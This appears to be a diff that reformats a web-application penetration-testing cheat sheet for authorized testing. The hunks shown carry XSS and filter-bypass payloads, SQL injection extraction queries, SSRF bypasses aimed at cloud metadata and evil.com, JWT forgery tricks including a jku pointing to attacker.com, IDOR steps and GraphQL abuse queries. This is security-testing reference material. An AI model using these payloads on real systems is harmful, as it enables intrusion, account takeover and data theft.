@@ -11,6 +11,7 @@ Safe, non-destructive test payloads and detection patterns for authorized securi
 These payloads test whether user input is reflected in HTTP responses without proper encoding. Use in search fields, URL parameters, form inputs, and HTTP headers.
 
 **Basic payloads:**
+
 ```
 <script>alert(document.domain)</script>
 "><script>alert(document.domain)</script>
@@ -24,6 +25,7 @@ These payloads test whether user input is reflected in HTTP responses without pr
 ```
 
 **Filter bypass payloads:**
+
 ```
 <ScRiPt>alert(document.domain)</ScRiPt>
 <scr<script>ipt>alert(document.domain)</scr</script>ipt>
@@ -34,6 +36,7 @@ javascript:alert(document.domain)//
 ```
 
 **URL encoding payloads:**
+
 ```
 %3Cscript%3Ealert(document.domain)%3C/script%3E
 %3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E
@@ -42,12 +45,14 @@ javascript:alert(document.domain)//
 **Context-specific payloads:**
 
 Inside HTML attribute:
+
 ```
 " onmouseover="alert(document.domain)
 ' onfocus='alert(document.domain)' autofocus='
 ```
 
 Inside JavaScript string:
+
 ```
 ';alert(document.domain);//
 \';alert(document.domain);//
@@ -55,6 +60,7 @@ Inside JavaScript string:
 ```
 
 Inside CSS:
+
 ```
 expression(alert(document.domain))
 url(javascript:alert(document.domain))
@@ -75,6 +81,7 @@ Test these in persistent fields: user profiles, comments, forum posts, file uplo
 Look for JavaScript that reads from these sources and writes to dangerous sinks:
 
 **Sources** (attacker-controlled input):
+
 ```
 document.location
 document.location.hash
@@ -87,6 +94,7 @@ postMessage data
 ```
 
 **Sinks** (dangerous output):
+
 ```
 element.innerHTML
 element.outerHTML
@@ -110,6 +118,7 @@ location.assign(...)
 ### Detection Payloads
 
 **Error-based detection:**
+
 ```
 '                          -- Single quote triggers SQL error
 "                          -- Double quote
@@ -123,6 +132,7 @@ location.assign(...)
 ```
 
 **Union-based enumeration** (authorized testing only):
+
 ```sql
 -- Step 1: Find column count
 ' ORDER BY 1--
@@ -142,6 +152,7 @@ location.assign(...)
 ```
 
 **Time-based blind injection:**
+
 ```sql
 -- MySQL
 ' AND SLEEP(5)--
@@ -159,6 +170,7 @@ location.assign(...)
 ```
 
 **Boolean-based blind injection:**
+
 ```sql
 -- Extract data one character at a time
 ' AND SUBSTRING(username,1,1)='a'--
@@ -168,13 +180,13 @@ location.assign(...)
 
 ### Database-Specific Syntax
 
-| Feature | MySQL | PostgreSQL | MSSQL | SQLite |
-|---------|-------|------------|-------|--------|
-| String concat | `CONCAT('a','b')` | `'a' \|\| 'b'` | `'a' + 'b'` | `'a' \|\| 'b'` |
-| Comment | `-- ` or `#` | `--` | `--` | `--` |
-| Version | `VERSION()` | `version()` | `@@version` | `sqlite_version()` |
-| Current user | `CURRENT_USER()` | `current_user` | `SYSTEM_USER` | N/A |
-| Sleep | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` | N/A |
+| Feature       | MySQL             | PostgreSQL     | MSSQL                   | SQLite             |
+| ------------- | ----------------- | -------------- | ----------------------- | ------------------ |
+| String concat | `CONCAT('a','b')` | `'a' \|\| 'b'` | `'a' + 'b'`             | `'a' \|\| 'b'`     |
+| Comment       | `-- ` or `#`      | `--`           | `--`                    | `--`               |
+| Version       | `VERSION()`       | `version()`    | `@@version`             | `sqlite_version()` |
+| Current user  | `CURRENT_USER()`  | `current_user` | `SYSTEM_USER`           | N/A                |
+| Sleep         | `SLEEP(5)`        | `pg_sleep(5)`  | `WAITFOR DELAY '0:0:5'` | N/A                |
 
 ---
 
@@ -217,6 +229,7 @@ http://169.254.169.254/metadata/v1/
 ### Bypass Techniques
 
 **IP encoding tricks:**
+
 ```
 http://0x7f000001           -- Hex encoding of 127.0.0.1
 http://2130706433           -- Decimal encoding of 127.0.0.1
@@ -226,6 +239,7 @@ http://127.0.0.1.nip.io     -- DNS rebinding via nip.io
 ```
 
 **URL parsing inconsistencies:**
+
 ```
 http://127.0.0.1@evil.com   -- URL authority confusion
 http://evil.com#@127.0.0.1  -- Fragment confusion
@@ -234,6 +248,7 @@ http://evil.com\@127.0.0.1  -- Backslash confusion
 ```
 
 **Redirect chains:**
+
 ```
 # If the app follows redirects, find an open redirect first:
 https://target.com/redirect?url=http://169.254.169.254/
@@ -246,6 +261,7 @@ https://target.com/redirect?url=http://169.254.169.254/
 ### Decode Without Verification
 
 JWTs are Base64URL-encoded and can be decoded without the secret:
+
 ```bash
 # Decode header
 echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d
@@ -259,6 +275,7 @@ echo "eyJ1c2VyIjoiYWRtaW4ifQ" | base64 -d
 ### Algorithm Confusion Attacks
 
 **None algorithm attack:**
+
 ```json
 // Original header
 {"alg": "HS256", "typ": "JWT"}
@@ -271,6 +288,7 @@ echo "eyJ1c2VyIjoiYWRtaW4ifQ" | base64 -d
 
 **RS256 to HS256 confusion:**
 If the server uses RS256 (asymmetric), try:
+
 1. Get the server's RSA public key (from JWKS endpoint or TLS certificate)
 2. Change `alg` to `HS256`
 3. Sign the token using the RSA public key as the HMAC secret
@@ -281,18 +299,19 @@ If the server uses RS256 (asymmetric), try:
 ```json
 // Common claims to modify:
 {
-  "sub": "1234567890",    // Change to another user's ID
-  "role": "admin",         // Escalate from "user" to "admin"
-  "is_admin": true,        // Toggle admin flag
-  "exp": 9999999999,       // Extend expiration far into the future
-  "aud": "admin-api",      // Change audience
-  "iss": "trusted-issuer"  // Spoof issuer
+  "sub": "1234567890", // Change to another user's ID
+  "role": "admin", // Escalate from "user" to "admin"
+  "is_admin": true, // Toggle admin flag
+  "exp": 9999999999, // Extend expiration far into the future
+  "aud": "admin-api", // Change audience
+  "iss": "trusted-issuer" // Spoof issuer
 }
 ```
 
 ### Weak Secret Brute Force
 
 Common JWT secrets to try (if you have a valid token to test against):
+
 ```
 secret
 password
@@ -309,12 +328,14 @@ Use tools like `jwt-cracker` or `hashcat -m 16500` for dictionary attacks.
 ### JWKS Injection
 
 If the server fetches keys from a JWKS URL in the JWT header:
+
 ```json
 {
   "alg": "RS256",
   "jku": "https://attacker.com/.well-known/jwks.json"
 }
 ```
+
 Host your own JWKS with a key pair you control.
 
 ---
@@ -325,6 +346,7 @@ Host your own JWKS with a key pair you control.
 
 **Step 1: Identify resource identifiers**
 Map all API endpoints and find parameters that reference resources:
+
 ```
 GET /api/users/{id}/profile
 GET /api/orders/{orderId}
@@ -334,11 +356,13 @@ DELETE /api/comments/{commentId}
 ```
 
 **Step 2: Create two test accounts**
+
 - User A (attacker) and User B (victim)
 - Authenticate as both and capture their tokens
 
 **Step 3: Cross-account access testing**
 Using User A's token, request User B's resources:
+
 ```
 # Read
 GET /api/users/{B_id}/profile     → Should be 403
@@ -353,6 +377,7 @@ DELETE /api/comments/{B_commentId} → Should be 403
 ```
 
 **Step 4: ID manipulation**
+
 ```
 # Sequential IDs — increment/decrement
 /api/users/100 → /api/users/101
@@ -370,6 +395,7 @@ DELETE /api/comments/{B_commentId} → Should be 403
 ### BFLA (Broken Function Level Authorization)
 
 Test access to administrative functions:
+
 ```
 # As regular user, try admin endpoints:
 POST   /api/admin/users                → 403
@@ -417,11 +443,16 @@ GET /api/users/profile
 ### Introspection Query
 
 Use this to map the entire schema (should be disabled in production):
+
 ```graphql
 {
   __schema {
-    queryType { name }
-    mutationType { name }
+    queryType {
+      name
+    }
+    mutationType {
+      name
+    }
     types {
       name
       kind
@@ -430,9 +461,17 @@ Use this to map the entire schema (should be disabled in production):
         type {
           name
           kind
-          ofType { name kind }
+          ofType {
+            name
+            kind
+          }
         }
-        args { name type { name } }
+        args {
+          name
+          type {
+            name
+          }
+        }
       }
     }
   }
@@ -442,6 +481,7 @@ Use this to map the entire schema (should be disabled in production):
 ### Query Depth Attack
 
 Nested queries can cause exponential resource consumption:
+
 ```graphql
 {
   users {
@@ -467,34 +507,56 @@ Nested queries can cause exponential resource consumption:
 ### Query Complexity Attack
 
 Wide queries with aliases:
+
 ```graphql
 {
-  a: users(limit: 1000) { name email }
-  b: users(limit: 1000) { name email }
-  c: users(limit: 1000) { name email }
-  d: users(limit: 1000) { name email }
-  e: users(limit: 1000) { name email }
+  a: users(limit: 1000) {
+    name
+    email
+  }
+  b: users(limit: 1000) {
+    name
+    email
+  }
+  c: users(limit: 1000) {
+    name
+    email
+  }
+  d: users(limit: 1000) {
+    name
+    email
+  }
+  e: users(limit: 1000) {
+    name
+    email
+  }
 }
 ```
 
 ### Batch Query Attack
 
 Send multiple operations in a single request to bypass rate limiting:
+
 ```json
 [
-  {"query": "mutation { login(user:\"admin\", pass:\"pass1\") { token } }"},
-  {"query": "mutation { login(user:\"admin\", pass:\"pass2\") { token } }"},
-  {"query": "mutation { login(user:\"admin\", pass:\"pass3\") { token } }"},
-  {"query": "mutation { login(user:\"admin\", pass:\"pass4\") { token } }"},
-  {"query": "mutation { login(user:\"admin\", pass:\"pass5\") { token } }"}
+  { "query": "mutation { login(user:\"admin\", pass:\"pass1\") { token } }" },
+  { "query": "mutation { login(user:\"admin\", pass:\"pass2\") { token } }" },
+  { "query": "mutation { login(user:\"admin\", pass:\"pass3\") { token } }" },
+  { "query": "mutation { login(user:\"admin\", pass:\"pass4\") { token } }" },
+  { "query": "mutation { login(user:\"admin\", pass:\"pass5\") { token } }" }
 ]
 ```
 
 ### Field Suggestion Exploitation
 
 GraphQL often suggests similar field names on typos:
+
 ```graphql
-{ users { passwor } }
+{
+  users {
+    passwor
+  }
+}
 # Response: "Did you mean 'password'?"
 ```
 
@@ -506,10 +568,10 @@ Use this to discover hidden fields without full introspection.
 query {
   publicUser(id: 1) {
     name
-    ...on User {
-      email           # Should be restricted
-      ssn             # Should be restricted
-      creditCard      # Should be restricted
+    ... on User {
+      email # Should be restricted
+      ssn # Should be restricted
+      creditCard # Should be restricted
     }
   }
 }
